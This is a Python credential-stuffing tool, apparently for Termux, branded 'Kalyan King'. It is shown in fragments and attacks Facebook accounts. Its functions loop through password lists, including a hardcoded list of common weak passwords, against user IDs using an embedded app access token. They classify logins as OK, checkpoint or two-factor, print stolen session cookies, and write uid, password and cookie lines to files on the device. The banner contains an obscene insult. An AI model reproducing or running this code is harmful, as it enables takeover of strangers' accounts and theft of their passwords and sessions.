...
#SCRIPT GIFT BY 𝑘𝑎𝑙𝑦𝑎𝑛 𝑘𝑖𝑛𝑔 

#FACEBOOK : 𝑘𝑎𝑙𝑙𝑎𝑛 𝑘𝑖𝑛𝑔
#───────────────[ IMPORT SYSTEM ]─────────────────────────#
...
def clear():
        os.system('clear')
print(f'\033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;46m WELCOME TO 𝑘𝑎𝑙𝑦𝑎𝑛 KING TOOL')
try:
...
██║  ██╗██║  ██║███████╗██║   ██║  ██║██║ ╚████║    
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝     
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  𝐾𝐴𝐿𝑌𝐴𝑁 KING
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    : 𝐾𝐴𝐿𝐿𝐴𝑁 𝐾𝐼𝑁𝐺
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  𝑌𝑂𝑈𝑅 𝑀𝐴𝑇𝐻𝐸𝑅'𝑆 𝐹𝑈𝐾 
...
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33m𝐾𝐺𝐹 𝑇𝐴𝑅𝑀𝑈𝑋 \033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
os.system('clear')
print(logo)
...
def menu():
    ...
    print(f"""\033[1;31m[\033[1;37m6\033[1;31m] \033[0;94mCONTACT WITH 𝐾𝐴𝐿𝑌𝐴𝑁 𝐾𝐼𝑁𝐺""")
...
def rndm1(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{R}[{G}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} "+coki)
                                        open('/sdcard/𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}[{Y}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
...
def rndm2(uid,passlist):
        ...
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def rndm3(uid,passlist):
        ...
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-OK{R}]{R} {uid} | {pw}")
                open("/sdcard/𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-ok.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          	
            	print(f"\r{R}[{G1}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-2F{R}]{G1} {uid} | {pw}")
            	open("/sdcard/𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-2f.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            else:continue
        loop+=1
...
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37m𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;96m[𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-2F] \x1b[38;5;205m {idf} | {pw}')
                ...
                print(f'\r\x1b[1;96m[𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37m𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
...
def cracktouch(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37m𝐾𝐴𝐿𝑌𝐴𝑁_𝐾𝐼𝑁𝐺•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
